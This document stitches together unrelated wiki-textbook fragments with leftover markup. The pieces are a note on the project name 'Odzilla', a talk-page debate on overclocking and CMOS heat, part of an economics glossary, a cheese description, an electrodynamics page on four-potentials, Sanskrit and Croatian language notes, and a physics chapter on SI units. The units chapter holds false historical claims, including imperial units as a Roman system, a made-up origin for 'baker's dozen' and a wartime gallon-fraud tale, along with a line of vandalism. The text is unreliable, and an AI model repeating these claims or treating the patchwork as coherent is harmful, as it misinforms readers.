HTML documents proved ineffective in terms of search, versioning, classification, annotation and copyright. The time has come for the component-based, structured information storage.

==About the name – &quot;Odzilla&quot;==

''Odzihozo'' in the native American Abenaki mythology is '''&quot;The Man Who Made Himself&quot;'''. The story goes like this:

&lt;pre&gt;
Before he had legs, Odzihozo dragged himself around, gouging valleys in the land's surface 
and piling up dirt with his hands to build mountains. Finally, he made Lake Champlain and,
satisfied with his work decided to stay there forever.
&lt;/pre&gt;

Anyway, the name ''Odzilla'' (after Odzihozo) has two meanings:
* '''The Man Who Can Make Himself''' – the one who can teach yourself everything he wants and wait until he’ll be smart enough to have his legs growing;
* '''The Compendium of Knowledge That Makes Itself''' – the collaborative, &quot;intercreative&quot; (the term coined by Tim Berners-Lee) project that is constantly evolves and expands – &quot;creating valleys, river beds and mountains&quot; along the way.

It is also impossible to escape the resemblance between the sound of the name &quot;Odzilla&quot; and ''Godzilla''. Well, as encyclopedia has it, Godzilla (or Gojira, ゴジラ in Japanese) is a ''daikaiju'' (strange beast or giant monster) in a series of films made in Japan in 1954.
Okay, Odzilla is intended to be a ''daikaiju'' after all.

      <text xml:space="preserve">Just as a question, does anyone think that this is completely relevant to the actual building process?  I have nothing against overclocking, but I wonder whether it's suited to the target audience... --[[User:Noogz|Noogz]] 07:08, 24 Mar 2005 (UTC)

:Yes, because it's something you do with your new computer. And a lot of over clockers are doing so with computers they built. [[User:Reub2000|Reub2000]] 07:36, 24 Mar 2005 (UTC)
::It's not a very good thing to do with your new computer. The speed increase could be had by waiting a few months instead. That's all you get, just a few months worth of advantage. Overclocking an obsolete computer makes more sense, because it's already out of warranty and you'd be buying a new system anyway if the old one won't go faster.

::Overclocking has little to do with building a new computer. Cooling is related, but that should '''not''' go here because all computers need some form of cooling. [[User:AlbertCahalan|AlbertCahalan]] 01:43, 4 May 2005 (UTC)

:::I take it that you don't spend much time around computer hardware forums, where they like to overclock anything they can get their hands on. It's relevent because I belive that most overclocking takes place on self built computers. OEM computers usually can't be overclocked. And many computer enthusests (people who build comps) also overclock. Besides, OCing a Radeon X850XT PE (new hardware) is the only way to get the fastest video card available. [[User:Reub2000|Reub2000]] 06:35, 4 May 2005 (UTC)

I agree with [[User:AlbertCahalan|AlbertCahalan]]. Building a computer always involves cooling, but overclocking is optional. If there is no objection, I'm going to move stuff about making computers quieter (is there a name for that ?), making a CPU go faster (overclocking), RAID, putting pretty lights on the case, etc. into an appendix, to emphasize that they are optional. --[[User:DavidCary|DavidCary]] 17:14, 21 May 2005 (UTC)

== No heat increase with speed increase? ==

A voltage increase will definitely cause more heat, but with current CMOS technology speed will also affect heat output. Think about it for a moment: during HLT (i.e. in idle CPU cycles) the CPU is effectively stopped, but running at a voltage. But, the idler the CPU, the cooler it is. This is because CMOS technology only consumes significant amounts of power during switching. With CPUs some is added to this due to leakage and tunneling, but an important part of the power consumed is still due to switching. Thus, AFAIK a speed increase can and will increase heat output, although less noticeably than a voltage increase. [[User:Marcan|Marcan]] 02:12, 11 August 2005 (UTC)

:Interesting. Some people (including myself, who knows a little about AC circuits) thought it would either reduce the heat output or keep it the same). In theory, increasing the frequency prevents the circuit Vmax reaching its peak and sink values, which would seem to reduce power consumption and heat output. However, this measure does not include the current, and switching would increase it assuming that the idle state is 'off'. Is this right?

Websites are typically quite ambigious on this subject. In particular, it is hardly ever made clear if overclocking or the temperature itself causes malfunctions. I think this one should make it clear.--[[User:ChrisJMoor|ChrisJMoor]] 02:09, 7 December 2005 (UTC)

:CPUs are CMOS circuits, usually, iirc.  I was under the impression that higher frequency = higher current in this case, and since i*v=p, more power. --[[User:Anaraug|Anaraug]] 09:59, 3 February 2006 (UTC)

I agree with ChrisJMoor -- this book should make things clear.
The [[w:CMOS#Power:_switching_and_leakage]] article mentions that the biggest source of power consumption in digital CMOS devices is
: ''&quot;... the characteristic switching power dissipated by a CMOS device: &lt;math&gt; P = C V^2 f &lt;/math&gt;.&quot;''

Can we explain this in a way that is not too complicated? But also not oversimplified?

My understanding is that *both* overclocking *and* too-high temperature cause different sorts of malfunctions.
Here are 2 kinds (are there others I am forgetting?)
* overclocking error: the combinatorial logic from one latch to the next latch takes a certain amount of time to settle. If the destination latch is clocked too soon after the source latch was clocked, there is not enough time for the logic to settle, and the &quot;wrong&quot; values get fed into the destination latch. That's the whole point of long pipelines -- they split up the logic into many thin layers, and insert latches between each layer, improving the worst-case settling-time (through the thickest layer). Clocking a device faster than this worst-case settling time causes occasional &quot;wrong&quot; values to be latched.
* temperature damage: In a CMOS device, electrical energy is converted to thermal energy almost entirely in the transistors. If the transistors get too hot, the carefully placed patterns of diffusion can blur and melt, permanently damaging the chip. If they blur into a short-circuit, then the chip rapidly self-destructs.

My understanding is that older microcoded processors showed obvious settling-time errors at clock rates well below the temperature-damage clock rate, even without heat sinks.
But now that most chip designers have figured out better ways to avoid such settling-time errors (pipelines, transistor sizing, buffering long lines, low-skew clock-tree networks, etc.), well-designed chips simply don't have settling-time errors at clock rates from DC all the way up to the clock rate that causes thermal self-destruction.

== Things that can't be overclocked ==

&quot;(But you wouldn't be reading this guide if you're using an OEM computer, would you?)&quot;
I think this is a completely unnecessary thing to say, and looks like a bad attempt at humor.  It should be removed.</text>

*&lt;b&gt;Absolute Value&lt;/b&gt; - the value of a number without regard to a plus or minus sign.
*&lt;b&gt;Accelerator Principle&lt;/b&gt; - the proposition that a higher rate of growth in &lt;i&gt;real GDP&lt;/i&gt; results in a higher level of &lt;i&gt;investment spending&lt;/i&gt;, and a lower growth rate in real GDP leads to lower planned investment spending.
*&lt;b&gt;Actual Investment Spending&lt;/b&gt; - the sum of &lt;i&gt;planned investment spending&lt;/i&gt; and &lt;i&gt;unplanned investment spending&lt;/i&gt;.
*&lt;b&gt;AD-AS model&lt;/b&gt; - the basic model used to understand fluctuation in &lt;i&gt;aggregate output&lt;/i&gt; and the &lt;i&gt;aggregate price level&lt;/i&gt;. It uses the &lt;i&gt;aggregate supply curve&lt;/i&gt; and the &lt;i&gt;aggregate demand curve&lt;/i&gt; together to analyze the behavior of the &lt;i&gt;economy&lt;/i&gt; in response to shocks of government policy.
*&lt;b&gt;Aggregate Consumption Function&lt;/b&gt; - the relationship for the &lt;i&gt;economy&lt;/i&gt; as a whole between aggregate current &lt;i&gt;disposable income&lt;/i&gt; and aggregate &lt;i&gt;consumer spending&lt;/i&gt;.
*&lt;b&gt;Aggregate Demand Curve&lt;/b&gt; - a graphical representation that shows the relationship between the &lt;i&gt;aggregate price level&lt;/i&gt; and the quantity of &lt;i&gt;aggregate output&lt;/i&gt; demanded by &lt;i&gt;households, firms,&lt;/i&gt; the government and the rest of the world. The aggregate demand curve has a negative slope due to the &lt;i&gt;wealth effect of a change in the aggregate price level&lt;/i&gt; and the &lt;i&gt;interest rate effect of a change in the aggregate price level&lt;/i&gt;.
*&lt;b&gt;Aggregate Output&lt;/b&gt; - the total quantity of &lt;i&gt;final goods and services&lt;/i&gt; the &lt;i&gt;economy&lt;/i&gt; produces for a given time period, usually a year. &lt;i&gt;Real GDP&lt;/i&gt; is the numerical measure of aggregate output typically used by economists.
*&lt;b&gt;Aggregate Price Level&lt;/b&gt; - a single number that represents the overall price level for &lt;i&gt;final goods and services&lt;/i&gt; in the &lt;i&gt;economy&lt;/i&gt;.

*&lt;b&gt;Aggregate Spending&lt;/b&gt; - the total flow of funds into markets for domestically produced &lt;i&gt;final goods and services&lt;/i&gt;; the sum of &lt;i&gt;consumer spending, investment spending, government purchases of goods and services&lt;/i&gt;, and &lt;i&gt;exports&lt;/i&gt; minus &lt;i&gt;imports&lt;/i&gt;.
*&lt;b&gt;Aggregate Supply Curve&lt;/b&gt; - a graphical representation that shows the relationship between the &lt;i&gt;aggregate price level&lt;/i&gt; and the total quantity of &lt;i&gt;aggregate output&lt;/i&gt; supplied.

*&lt;b&gt;Autarky&lt;/b&gt; - a situation in which a country does not trade with other countries.
*&lt;b&gt;Automatic Stabilizers&lt;/b&gt; - government spending and taxation rules that cause &lt;i&gt;fiscal policy&lt;/i&gt; to be automatically expansionary when the &lt;i&gt;economy&lt;/i&gt; contracts and automatically contractionary when the economy expands without requiring any deliberate actions by policy makers. Taxes that depend on &lt;i&gt;disposable income&lt;/i&gt; are the most important example of automatic stabilizers.
*&lt;b&gt;Autonomous Change in Aggregate Spending&lt;/b&gt; - an initial rise or fall in &lt;i&gt;aggregate spending&lt;/i&gt; at a given level of &lt;i&gt;real GDP&lt;/i&gt;.

*&lt;b&gt;Balance of Payments on Current Account&lt;/b&gt; - transactions that don't create liabilities; a country's &lt;i&gt;balance of payments on goods and services&lt;/i&gt; plus net international transfer payments and factor income.
*&lt;b&gt;Balance of Payments on Financial Account&lt;/b&gt; - international transactions that involve the sale or purchase of assets, and therefore create future liabilities.
*&lt;b&gt;Balance of Payments on Goods and Services&lt;/b&gt; - the difference between the value of &lt;i&gt;exports&lt;/i&gt; and the value of &lt;i&gt;imports&lt;/i&gt; during a given period.
*&lt;b&gt;Balance Sheet Effects&lt;/b&gt; - the reduction in a firm's net worth from falling asset prices.
*&lt;b&gt;Bank&lt;/b&gt; - a &lt;i&gt;financial intermediary&lt;/i&gt; that provides &lt;i&gt;liquid&lt;/i&gt; assets in the form of &lt;i&gt;bank deposits&lt;/i&gt; to lenders and uses those funds to finance the &lt;i&gt;illiquid&lt;/i&gt; investments or &lt;i&gt;investment spending&lt;/i&gt; needs of borrowers.

*&lt;b&gt;Black Market&lt;/b&gt; - a market in which goods or services are bought and sold illegally, either because it is illegal to sell them at all or because the prices charged are legally prohibited by a &lt;i&gt;price ceiling&lt;/i&gt;.
*&lt;b&gt;Bond&lt;/b&gt; - a legal document based on borrowing in the form of an IOU that pays interest.
*&lt;b&gt;Budget Balance&lt;/b&gt; - the difference between tax revenue and government spending. A positive budget balance is referred to as a &lt;i&gt;budget surplus&lt;/i&gt;; a negative budget is referred to as a &lt;i&gt;budget deficit&lt;/i&gt;.
*&lt;b&gt;Budget Deficit&lt;/b&gt; - the difference between tax revenue and government spending when government spending exceeds tax revenue; dissaving by the government in the form of a budget deficit is a negative contribution to &lt;i&gt;national savings&lt;/i&gt;.
*&lt;b&gt;Budget Surplus&lt;/b&gt; - the difference between tax revenue and government spending when tax revenue exceeds government spending; saving by the government in the form of a budget surplus is a positive contribution to &lt;i&gt;national savings&lt;/i&gt;.

*&lt;b&gt;Business-Cycle Trough&lt;/b&gt; - the point in time at which the &lt;i&gt;economy&lt;/i&gt; shifts from &lt;i&gt;recession&lt;/i&gt; to &lt;i&gt;expansion&lt;/i&gt;.

==C==
*&lt;b&gt;Capital Inflow&lt;/b&gt; - the net inflow of funds into a country; the difference between the total inflow of foreign funds to the home country and the total outflow of domestic funds to other countries. A positive net captial inflow represents funds borrowed from foreigners to finance domestic investment; a negative net capital inflow represents funds lent to foreigners to finance foreign investment.
*&lt;b&gt;Causal Relationship&lt;/b&gt; - the relationship between two &lt;i&gt;variables&lt;/i&gt; in which the value taken by one variable directly influences or determines the value taken by the other variable.

*&lt;b&gt;Commodity-Backed Money&lt;/b&gt; - a &lt;i&gt;medium of exchange&lt;/i&gt; that has no intrinsic value whose ultimate value is guaranteed by a promise that it can be converted into valuable goods on demand.
*&lt;b&gt;Comparative Advantage&lt;/b&gt; - the advantage conferred on an individual or nation in producing a good or service if the &lt;i&gt;opportunity cost&lt;/i&gt; of producing the good or service is lower for that individual or nation than other producers.

*&lt;b&gt;Convergence Hypothesis&lt;/b&gt; - a principle of economic growth that holds that international differences in &lt;i&gt;real GDP&lt;/i&gt; per capita tend to narrow over time because countries that start with lower real GDP per capita tend to have highet growth rates.
*&lt;b&gt;Cost&lt;/b&gt; - (of potential seller) the lowest price at which a seller is willing to sell a good.
*&lt;b&gt;Crowding Out&lt;/b&gt; - the negative effect of &lt;i&gt;budget deficits&lt;/i&gt; on private investment, which occurs because government borrowing drives up &lt;i&gt;interest rates&lt;/i&gt;.

==D==
*&lt;b&gt;Debt Deflation&lt;/b&gt; - the reduction in aggregate demand arising from the increase in the real burden of outstanding debt caused by &lt;i&gt;deflation&lt;/i&gt;; occurs because borrowers, whose real debt rises as a result of deflation, are likely to cut spending sharply, and lenders, whose real assets are now more valuable, are less likely to increase spending.

*&lt;b&gt;Discouraged Workers&lt;/b&gt; - individuals who want to work but who have stated to government researchers that they aren't currently searching for a job because they see little prospect of finding one given the state of the job market.
*&lt;b&gt;Discretionary Fiscal Policy&lt;/b&gt; - &lt;i&gt;fiscal policy&lt;/i&gt; that is the direct result of deliberate actions by policy makers rather than rules.

*&lt;b&gt;Liquidity Trap&lt;/b&gt; a situation in which &lt;i&gt;monetary policy&lt;/i&gt; is ineffective because &lt;i&gt;nominal interest rates&lt;/i&gt; are up against the &lt;i&gt;zero bound&lt;/i&gt;.
*&lt;b&gt;Loan&lt;/b&gt; - a lending agreement between an individual lender and an individual borrower. Loans are usually tailored to the individual borrower's needs and ability to pay but carry relatively high &lt;i&gt;transactions costs&lt;/i&gt;.

Because consumers normally spend part but not all of an additional dollar of disposable income, &lt;i&gt;MPC&lt;/i&gt; is between 0 and 1.
*&lt;b&gt;Marginal Propensity to Save (MPS)&lt;/b&gt; - the fraction of an additional dollar of &lt;i&gt;disposable income&lt;/i&gt; that is saved; &lt;i&gt;MPS&lt;/i&gt; is equal to 1-&lt;i&gt;MPC&lt;/i&gt;.

'''Wensleydale''' is a white, crumbly-textured cows milk cheese, originally from Wensleydale in Yorkshire, England. Very pleasant as a dessert cheese, it has a fresh, slightly sweet taste.

Blue Wensleydale is a rarer variety; some ewes milk is added to encourage the development of blue veins.

      <text xml:space="preserve">{{Electrodynamics}}

== Elecromagnetic Four-Potential ==

This page will introduce the '''Four-Potential''', and the '''Four-Current''' notations, as well as the '''d'Alembertian''', which is used when studying these topics under the theoretical framework of [[Special relativity]]. These constructs, while a little confusing for some people, are fundamental to the way in which modern physicists study electric and magnetic fields, and therefore are worth learning. These topics may be introduced a little early here, although this chapter will not be rigorous. Instead, we will provide some common results here, and explain them thoughtout the next few chapters.

=== Potentials, As They Stand ===

Electric Potential (V), and Magnetic Vector Potential ('''A''') are given by:

:&lt;math&gt; \mathbf {E} = -\nabla V &lt;/math&gt;

:&lt;math&gt; \mathbf B = \nabla \times \mathbf A &lt;/math&gt;

Using Gauss's Law for Electricity:

:&lt;math&gt; \nabla \cdot \mathbf {E} = \frac {\rho}{\epsilon_0} &lt;/math&gt;

and then substituting E with the Gradient of V. We see that:

:&lt;math&gt; \nabla \cdot \nabla V = -\frac {\rho}{\epsilon_0} &lt;/math&gt;

or:

:&lt;math&gt; \nabla^2 V = -\frac {\rho}{\epsilon_0} &lt;/math&gt;

And from Coulomb's Law we see that:

:&lt;math&gt; V = \frac{1}{4 \pi \epsilon_0} \int \frac{\rho}{\tau}{d\tau}&lt;/math&gt;

Using a similar technique in Magnetostatics gives:

:&lt;math&gt;\nabla^2 \mathbf{A} = -\mu_0 \mathbf{J}&lt;/math&gt; and 

:&lt;math&gt;\mathbf{A} = \frac{\mu_0}{4 \pi} \int \frac{\mathbf{J}}{\tau}d\tau&lt;/math&gt;

==Four Potentials and Four Currents==

We define a vector called the '''Four Potential''' as:

:&lt;math&gt;A^\mu = \left (\frac{V}{c}, \mathbf{A}\right) = (V, A_x, A_y, A_z)&lt;/math&gt;

And another called the Four Current, which instead of V has &amp;rho;, the charge density, and instead of '''A''', has '''J''' the current density:

:&lt;math&gt;J^\mu = (c\rho, \mathbf{J}) = (\rho, J_x, J_y, J_z)&lt;/math&gt;

Where in each case c is the speed of light.

Both the Four-Potential and the Four-Current are vectors with four scalar values. What each of these values represents will be made clear at a later point.

== Bringing it Together ==

You may have noticed that the equations for '''A''' with '''J''' and V with &amp;rho; are pretty much the same, and that the Four Potential and Current contains only these. We can combine these into a single equation as such:

:&lt;math&gt; \nabla A^\mu = -\mu_0 J^\mu&lt;/math&gt;

and:

:&lt;math&gt; A^\mu = \frac{\mu_0}{4 \pi} \int \frac{J^\mu}{\tau}d\tau&lt;/math&gt;

== Relativity ==

The rules of relativity state that a current now cannot produce a magnetic field at a distance instantaneously. The effects of the current may travel at the speed of light at the fastest, and the field may not change any faster then that. If you've never looked at [[Special relativity]] before, this may be a good time to do so.

=== The d'Alembertian ===

We obviously need some term which compensates for the fact that nothing travels faster than light. So far our Laplacian operator looks like this:

:&lt;math&gt; \nabla^2 = \frac{\partial^2}{\partial x^2} +  \frac{\partial^2}{\partial y^2} + \frac{\partial^2}{\partial z^2}&lt;/math&gt;

But now we need to bring it into '''Minkowski Space''' (A way of describing Relativistic Space). We can notice that the Laplacian cannot be applied to a four vector, and that the Laplacian is not invariant under Lorentz Transformations. To correct this we use the '''d'Alembertian'''. We define the d'Alembertian as such:

:&lt;math&gt; \Box = \nabla^2 - \frac{1}{c^2} \frac{\partial^2}{\partial t^2} 
= \frac{\partial^2}{\partial x^2} +  \frac{\partial^2}{\partial y^2} + \frac{\partial^2}{\partial z^2}- \frac{1}{c^2} \frac{\partial^2}{\partial t^2} &lt;/math&gt;&lt;/center&gt; 

The d'Alembertian reduces to the Laplacian (&amp;nabla;&lt;sup&gt;2&lt;/sup&gt;) if we aren't worried about time dependence, or relativity. There are a number of different ways to denote the d'Alembertian, depending on what text you read. Here are a number of different methods that are used in common texts:

:&lt;math&gt; \Box = \Box^2 = \nabla_\mathbf{M} = \partial_i \partial^i = \partial^2 = \nabla^2 - \frac{1}{c^2} \frac{\partial^2}{\partial t^2} &lt;/math&gt;

;Note:This wikibook will use the &lt;math&gt;\Box&lt;/math&gt; notation for the d'Alembertian, for simplicity and ease of authoring.

We end up with our equation in terms of the d'Alembertian, as such:

:&lt;math&gt; \Box A^\mu = -\mu_0 J^\mu &lt;/math&gt;

We also have to bring in a time term into the integral form of the equation. It becomes:

:&lt;math&gt; A^\mu = \frac{\mu_0}{4 \pi} \int \frac{J^\mu(r',t')}{|r - r'|} d^3 r'&lt;/math&gt;</text>

      <text xml:space="preserve">==Gender and ending==
Sanskrit nouns come in the three standard genders: masculine, neuter, and feminine.  A noun's declension class depends on its gender and ending.  Most nouns end in vowels, with some ending in consonants.  

===Feminine noun endings===
Feminine nouns may end in आ, इ, ई, उ, ऊ, or ऋ.
===Neuter noun endings===
Neuter nouns may end in अ, इ, उ, or ऋ.


==Number and Case==

In dictionaries, Sanskrit nouns are often listed in root-form (मूलरुप). Sanskrit nouns are highly inflected, and change form depending on the number (singular (ऐक वचन), dual (द्वि वचन), and plural (बहु वचन)) and the case (nominative, accusative, instrumental, dative, ablative, genitive, or locative).

===Masculine noun endings===
Masculine nouns may end in अ, इ, उ, or ऋ.

      <text xml:space="preserve">==The Croatian alphabet==
Croatian is an easy language to spell and pronounce. Each letter is pronounced separately and clearly in any position and each word is spelt as it is pronounced.

The Croatian alphabet is a &quot;subset&quot; of the Latin alphabet and consists of 30 letters.

The following table lists all of the letters, together with pronunciations and &quot;as in...&quot; notes for easier pronunciation. 

Note: Because of their similarity in pronucation, most Croatian children don't learn to differ Č and Ć, Đ and DŽ or &quot;je&quot; and &quot;ije&quot; before fifth grade.

To oversimplify, remember six rules:

1. For the &quot;c&quot; without a hat, remember &quot;cats.&quot; In English we pronounce the cat's head (&quot;c&quot;) but in Croatian the tail is pronounced (&quot;ts&quot;).

2. A hat on a &quot;c,&quot; &quot;s,&quot; or &quot;z&quot; becomes an English &quot;ch,&quot; &quot;sh,&quot; or &quot;zh.&quot; Pronounce &quot;ć&quot; like &quot;č&quot; if you think no one expects Americans to speak foreign languages correctly.

3. DŽ is an English &quot;j,&quot; as in &quot;John.&quot; If you pronounce &quot;Đ&quot; and &quot;đ&quot; the same way, note rule #2.

4. For &quot;h&quot; pretend you're Scottish and saying &quot;loch&quot; or German saying &quot;Bach.&quot;

5. The &quot;i&quot; and &quot;u&quot; vowels are always long, never short.

6. The &quot;j&quot; is pronounced like &quot;y&quot; in English.

* Explain what is meant by `physical quantity'. -- clark: In the Introduction section, I replaced 'physical quantity' with 'measurement of a physical phenomenon'. Don't know if that's much clearer, really.
* Chapter is too full of tables and words  need figures to make it more interesting.
* Make researching history of SI units a small project.
* Multiply by one technique: not positive! Suggest using exponents instead (i.e. use the table of prefixes). This also works better for changing complicated units (km·h&lt;sup&gt;-1&lt;/sup&gt; to m&amp;middot;s&lt;sup&gt;&amp;minus;1&lt;/sup&gt; etc....). Opinion that this technique is limited in its application.
* Edit NASA story.
* The Temperature section should be cut-down. SW: I have edited the original section but perhaps a more aggressive edit is justified with the details deferred until the section on gases.</text>

      <text xml:space="preserve">{{FHSST Physics/Units}}

= Introduction =
Science focuses on studying how things happen in the real world -- things you can see, touch, hear, smell,feel, or imagine such as time. 

=== Fractions and decimals===
Early society had primitive ideas (s h I t) such as '''one, two or many''', then more sophisticated means of counting emerged, mainly relating to trade. Units of weight, volume and money were at first '''integer''' whole units, often recorded by notches in a tally stick or marks in clay tablets. About 6000 years ago, with the advent of writing came '''units''' such as the length of the king's arm, together with the idea of '''multiples''' such as dozens and scores, together with '''vulgar fractions''' based on halves, quarters and so on., In order to describe these things, it is necessary to carefully '''measure''' what is observed. 

In 1791, following the French Revolution, the decimal system was published based on tens and multiples or fractions of ten. The idea of ten months per year and ten days in a week were quickly dropped, but for most purposes it was revolutionary, with integrated standard weights and measures, such as fixing the second to the length of a pendulum of one metre, and the weight of a kilo of water the same as a litre volume.  Since the 1960s the International System of Units (&quot;Système International d'Unités&quot; in French, hence &quot;SI&quot;) has been almost universal outside the United States of America, which still prefers a version of the Imperial Roman measuring system which emerged more than 2000 years go and which is complicated and illogical. 

Measurements must always be reported with appropriate '''units''', which specify what '''type of quantity''' is being discussed - weight, length or whatever. For science and engineering, the SI system is universal and is not 'owned' by anyone, so it remains constant and free of political manipulation. As recently as 1897 the Indiana State Legislature,attempted (unsuccessfully) to set the value of Pi to 3.2, and during 1940, in Britain, the weight of a pound (lb) loaf of bread was legislated at a lower weight to concerve supplies during food rationing, giving rise to the expression 'baker's dozen' because you needed thirteen new loaves or buns for the same quantity of bread as 12 of the correct weight!

=== The Measurement and the Decimal Metric System ===
As a simple example of the importance of units, imagine you had to make curtains and needed to buy material. The shop assistant would need to know how much material was
required. Telling her you need material 2 wide and 6  long would be insufficient-- you have to specify the '''unit'''
(i.e. 2 ''metres'' wide and 6 ''metres'' long). Without the unit, the information is
incomplete and the shop assistant would have to guess. If you were making curtains for a doll's house the dimensions might be 2 centimetres wide and 6 centimetres long!

It is not just lengths that have units. Any measurement of any physical phenomenon--time, temperature, force, or voltage, just to name a few--has units.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
'''Tip''': Many physics problems ask you to determine a specific numeric quantity. When you solve the problem, '''do not forget''' to specify the '''units''' of your answer: even if you have the right number, your answer is not correct unless you include the correct units.
&lt;/blockquote&gt;

=== SI Units ===
In the remainder of this class we will be using '''SI''' units, which are defined in the table below. These seven units are used to measure fundamental quantities, and are the basis of everything we will do, as will be discussed in more detail in the next section.

== SI Units (Syst&amp;egrave;me International d'Unit&amp;eacute;s) ==
These units are internationally agreed upon and form the system we will use. Historically these units are based on the metric
system which was developed in France at the time of the French Revolution.

All physical quantities have units which can be built from the 7 base units listed in Table 1.1 (incidentally the choice of
these seven was arbitrary). They are called base units because none of them can be expressed as combinations of
the other six. This is similar to breaking a language down into a set of sounds from which all words are made. Another way of viewing the
base units is like the three primary colours. All other colours can be made from the primary colours but no primary colour can be made by combining the other two primaries.
 
Unit names are always written with lowercase initials (e.g. the metre). The symbols (or abbreviations) of units are also written with lowercase initials except if they are named after scientists (e.g. the kelvin (K) and the ampere (A)). An exception to this rule is the ''litre'', which is abbreviated as either L or l.

To make life convenient, particular combinations of the base units are given special names. This makes working with them easier, but it is always correct to reduce everything to the base units. Table 1.2 lists some examples of combinations of SI base units assigned special names. Do not be concerned if the formulae look unfamiliar at this stage&amp;mdash;we will deal with each in detail in the chapters ahead (as well as many others)!

It is very important that you are able to say the units correctly. For instance, the '''newton''' is another name for the '''kilogram metre per second squared''' (kg·m&amp;middot;s&lt;sup&gt;&amp;minus;2&lt;/sup&gt;), while the '''kilogram metre squared per second squared''' (kg·m&lt;sup&gt;2&lt;/sup&gt;&amp;middot;s&lt;sup&gt;&amp;minus;2&lt;/sup&gt;) is called the '''joule'''.

| align=&quot;CENTER&quot; | V (volt)
|}

Another important aspect of dealing with units is the prefixes that they sometimes have (prefixes are words or letters written in front that change the meaning).
The kilogram (kg) is a simple  example: 1 kg is 1000 g or 
&lt;math&gt;1\times { 10^3\mbox{ g}} &lt;/math&gt;.
Grouping the 10&lt;sup&gt;3&lt;/sup&gt; and the g together we can replace the 10&lt;sup&gt;3&lt;/sup&gt; with the prefix k (kilo). Therefore the k takes the place of the 10&lt;sup&gt;3&lt;/sup&gt;. Incidentally the kilogram is unique in that it is the only SI base unit containing a prefix.

There are prefixes for many powers of 10 (Table 1.3 lists a large set of these prefixes). This is a larger set than you will need but it serves as a good
reference. The case of the prefix symbol is very important. Where a letter features twice in the table, it is written in uppercase for exponents
bigger than one and in lowercase for exponents less than one. ''' Those prefixes listed in boldface should be learnt.'''

As another example of the use of prefixes,

==The Other Systems of Units== 
The remaining sets of units, although not used by us, are also internationally recognised and still in use by others. We will mention them briefly for interest only.  

=== CGS and MKS Units=== 
In this system the basic measure of length is the centimetre, weight is in grams and time is in seconds. Later the metre is replaced the centimetre and the kilogram replaced  the gram. The Second has remained the basic unit of time throughout. This is a simple change but it means that all units derived from these two are changed. For example, the units of force and work are different. These units are used most often in astrophysics and atomic physics.

When electromagnetism comes into play, there are three CGS systems, adapted to the fundamental equations each theory views as basic: The electric CGS, the magnetic CGS, and the combined Gaussian. The latter has the advantage that corresponding electric and magnetic phenomena have the same units and related equations.

It has the additional advantage that there is only one natural constant in the equations, the ''speed of light'', where the SI system has two. And experience, i.e. measurements, has shown that there is only one constant. So the Gaussion system is a bit more 'right'.

These unit systems also show that the choice of base units is arbitrary. In SI, there is a base unit for the current, the ampere [A], derived from it the unit of charge, coulomb [C]. The Gaussian system does without a dedicated unit for electricity. It simply defines the factor in the law of force between two charged particles as one - and lo, the unit C disappears; the esu (electrostatic unit) can be derived from g, cm, s - the C cannot, it is As, and A is basic.

[The same could be done with mass, leading to kg vanishing, just by setting the gravitational constant in Newton's law to one. kg would then be replaced by a combination of m and s.

===Imperial Units===
These units (as their name suggests) stem from the days when the Roman Empire decided measures. Some of these were later altered by local rulers. As a result, different countries used different base units for each  quantity (except for time). The British abandoned the Roman measurement and money system in 1972. There were 12 pennies or denaries in a shilling or solidus, and 20 shillings in a pound or libra ergo there were 240 'old pennies' and are now 100 new pennies in the pound sterling or GBP - which large unit was unchanged. The British also used both avoirdupois and troy weight and other capricious local measures, but following its integration in the EU, Britain now officially use decimal SI units for all measurements.
 
Although the British once used an imperial metric system similar to that in use in the US, it is important to know that there are some differences, because the colonists made certain incorrect assumptions, such as that because there were 16 ounces in a pound weight, there were also 16 fluid ounces in a pint of liquid, when the Romans and British defined 20 fl oz. This matters, because during World War II, for example,  great fraud was perpetrated by the British selling the smaller American gallons (8 pints) at the price for the larger British measure! 

The decimal metric system was invented in France in 1791, following the French revolution. This later became the MKS (Meter/Kilogram/Second) system and is now the System International (SI) system, which is still close that early French system.  Using different units in different places would make effective scientific communication very difficult. That is why the scientific community has adopted SI units as its internationally agreed upon standard. Therefore the SI is overwhelmingly predominant for nearly all international scientific and technical use.

===Natural Units=== 
This is the most sophisticated choice of units. Here the most fundamental discovered quantities (such as the speed of light) are set equal to 1. The argument for this choice is that all other quantities should be built from these fundamental units. This system of units is used in high energy physics and quantum mechanics.</text>

= The Importance of Units =
Without units much of our work as scientists would be meaningless. We need to express our thoughts clearly and units give meaning to the
numbers we calculate. Depending on which units we use, the numbers are different (e.g. 3.8 m and 3800 mm actually represent the same length). Units are an essential part of the language we use. Units must be
specified when expressing physical quantities. In the case of the curtain example at the beginning of the chapter, 
the result of a misunderstanding would simply have been an incorrect amount of material cut. However, sometimes such misunderstandings have
catastrophic results. Here is an extract from a story on CNN's website: 

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
'''NASA: Human error caused loss of Mars orbiter November 10, 1999'''
&lt;br/&gt;
WASHINGTON (AP) -- Failure to convert English measures to metric values caused the loss
of the Mars Climate Orbiter, a spacecraft that smashed into the planet instead of
reaching a safe orbit, a NASA investigation concluded Wednesday.
The Mars Climate Orbiter, a key craft in the space agency's exploration of the red planet,
vanished after a rocket firing September 23 that was supposed to put the spacecraft on orbit around Mars.
An investigation board concluded that NASA engineers failed to convert English measures
of rocket thrusts to newton, a metric system measuring rocket force. One English pound of
force equals 4.45 newtons. A small difference between the two values caused the spacecraft
to approach Mars at too low an altitude and the craft is thought to have smashed into the
planet's atmosphere and was destroyed.
The spacecraft was to be a key part of the exploration of the planet. From its station about
the red planet, the Mars Climate Orbiter was to relay signals from the Mars Polar Lander,
which is scheduled to touch down on Mars next month.
``The root cause of the loss of the spacecraft was a failed translation of English units
into metric units and a segment of ground-based, navigation-related mission software,&quot;
said Arthus Stephenson, chairman of the investigation board. Reported by CNN at http://www.cnn.com/TECH/space/9911/10/orbiter.02/
&lt;/blockquote&gt;

This story illustrates the importance of being aware that different systems of units exist. Furthermore, we must be able to convert
between systems of units!</text>

= Choice of Units =
There are no wrong units to use, but a clever choice of units can make a problem look simpler. The vast range of problems makes it impossible
to use a single set of units for everything without making some problems look much more complicated than they should. We can't
easily compare the mass of the sun and the mass of an electron, for instance. This is why astrophysicists and atomic physicists use
different systems of units.  

We won't ask you to choose between different unit systems. For your present purposes the SI system is
perfectly sufficient. In some cases you may come across quantities expressed in units other than the standard SI units. You will then
need to convert these quantities into the correct SI units. This is explained in the next section.</text>

